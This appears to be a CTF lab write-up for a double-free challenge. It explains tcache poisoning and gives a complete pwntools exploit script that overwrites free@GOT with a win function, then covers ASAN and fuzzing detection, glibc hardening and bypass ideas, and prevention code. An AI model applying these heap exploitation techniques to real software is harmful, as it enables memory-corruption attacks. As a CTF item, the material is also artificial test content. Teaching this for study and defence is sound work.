# Challenge 17: Double-Free

## Difficulty: Medium

## Vulnerability Type: Double-Free / Tcache Poisoning

## Description
The program has a double-free vulnerability that allows freeing the same chunk twice, enabling tcache poisoning and arbitrary write.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial
- **tcache**: Enabled

## Vulnerability Analysis

### The Bug
```c
void delete_all() {
    for (int i = 0; i < note_count; i++) {
        free(notes[i].content);  // Doesn't check is_free!
    }
}
```

If we:
1. Create note 0
2. Delete note 0 (sets is_free = 1, frees chunk)
3. Call delete_all (frees chunk AGAIN!)

Result: Same chunk is freed twice -> Double-free!

## Tcache Poisoning

### tcache Structure (Simplified)
```
tcache bin for size 128:
  head -> chunk_A -> chunk_B -> NULL
```

Each freed chunk contains a forward pointer to the next chunk in the list.

### Double-Free Effect
```
Initial: head -> NULL

free(chunk_A):
  head -> chunk_A -> NULL

free(chunk_A) again:
  head -> chunk_A -> chunk_A -> chunk_A -> ...
  (Circular list!)
```

### Exploitation Strategy
```
1. malloc() -> returns chunk_A
2. malloc() -> returns chunk_A again!
3. Write to first allocation -> overwrites forward pointer
4. malloc() -> returns chunk_A
5. malloc() -> returns arbitrary address we wrote!
```

## Complete Exploit

### Step 1: Cause Double-Free
```python
# Create note 0
choice = 1
content = b'AAAA'

# Delete note 0 normally
choice = 2
index = 0

# Delete all (causes double-free of note 0)
choice = 3
```

### Step 2: Tcache Poisoning
```python
# Allocate chunk A (from tcache)
choice = 1
content = b'chunk_A'

# Allocate chunk A again (double-free effect)
choice = 1
# Overwrite forward pointer to target address
target = 0x404040  # Some writable location
content = p64(target)

# Next malloc returns original chunk A
choice = 1
content = b'chunk_A_again'

# Next malloc returns our target address!
choice = 1
content = <payload to write at target>
```

### Complete Exploit Script
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9017)
else:
    p = process('./challenge')

p.recvuntil(b'at: ')
win_addr = int(p.recvline().strip(), 16)
log.info(f"win(): {hex(win_addr)}")

# Step 1: Create note 0
p.sendlineafter(b'Choice: ', b'1')
p.sendafter(b'content: ', b'note0\n')

# Step 2: Delete note 0
p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'index: ', b'0')

# Step 3: Delete all (double-free!)
p.sendlineafter(b'Choice: ', b'3')

# Step 4: Tcache poisoning
# Allocate first chunk (gets the double-freed chunk)
p.sendlineafter(b'Choice: ', b'1')
p.sendafter(b'content: ', b'A' * 8 + b'\n')

# Allocate second chunk (same chunk!) and poison forward pointer
# We want to overwrite __malloc_hook or similar
# For this challenge, we can overwrite a function pointer
# or create arbitrary write primitive

# Find a target to overwrite (e.g., GOT entry, function pointer)
# For simplicity, let's target a stack address or global

# Actually, simpler approach:
# Since we have arbitrary alloc, allocate at __free_hook location
# Then write win() address there

# Find __free_hook or use different technique...
# For CTF, often we can:
# 1. Leak heap address
# 2. Poison tcache to return address near sensitive data
# 3. Overwrite function pointer

# Simplified for educational purpose:
# Let's use the poisoning to get arbitrary malloc

p.sendlineafter(b'Choice: ', b'1')
# This allocation gets the same chunk again
# Write address of target (where we want next malloc to return)
target_addr = elf.got['free']  # Try to overwrite GOT
payload = p64(target_addr)
p.sendafter(b'content: ', payload + b'\n')

# Next malloc will return chunk A
p.sendlineafter(b'Choice: ', b'1')
p.sendafter(b'content: ', b'dummy\n')

# Next malloc will return our target!
p.sendlineafter(b'Choice: ', b'1')
# Overwrite free@GOT with win()
p.sendafter(b'content: ', p64(win_addr) + b'\n')

# Trigger free() -> calls win()
p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'index: ', b'0')

p.interactive()
```

## Automated Detection

### Static Analysis
- Multiple free() calls on same pointer
- free() in loop without NULL check
- Missing state tracking

### Dynamic Detection
```bash
# AddressSanitizer detects double-free
gcc -fsanitize=address challenge.c -o challenge
./challenge
# -> Will report: "attempting double-free"
```

### Fuzzing
AFL++ with ASAN:
```bash
afl-clang-fast -fsanitize=address challenge.c -o challenge
afl-fuzz -m none -i input -o output ./challenge
```

## Tcache Security (glibc Evolution)

### glibc < 2.29
- No double-free check in tcache!
- Easy to exploit

### glibc >= 2.29
- Added key-based double-free detection
- Each chunk has a key field
- Double-free detected and aborted

```c
// glibc 2.29+ tcache chunk
struct tcache_entry {
    struct tcache_entry *next;
    size_t key;  // New: detects double-free
};
```

### Bypass (glibc 2.29+)
- Free chunk A, allocate and modify key, free again
- Use different chunks to pollute tcache
- Leverage UAF to corrupt key

## Real-World Examples
- CVE-2017-15906: OpenSSH double-free
- CVE-2018-16487: PHP double-free
- CVE-2019-11043: PHP-FPM
- Many Chrome/Firefox JIT bugs

## Prevention

### Proper State Tracking
```c
free(ptr);
ptr = NULL;  // Prevents double-free

if (is_free) {
    printf("Already freed!\n");
    return;
}
```

### Defensive Programming
```c
void safe_free(void **ptr) {
    if (ptr && *ptr) {
        free(*ptr);
        *ptr = NULL;
    }
}
```

## Learning Objectives
- Double-free mechanics
- Tcache internals
- Heap metadata corruption
- Arbitrary allocation primitive
- Modern heap exploitation
- Glibc version differences

## Alternative Exploitation Paths

### 1. Overlap Chunks
Create overlapping allocations to corrupt data

### 2. Arbitrary Write
Use poisoned tcache to allocate at any address

### 3. Hook Overwrite
Overwrite __malloc_hook or __free_hook with win()

## Heap Exploitation Tools
```bash
# pwndbg/gef GDB extensions
heap chunks
vis_heap_chunks
tcache

# Analyze heap state
x/20gx <chunk_addr>
```

## Further Reading
- "Heap Exploitation" by Dhaval Kapil
- glibc malloc source code
- Phrack articles on heap exploitation
- "how2heap" repository
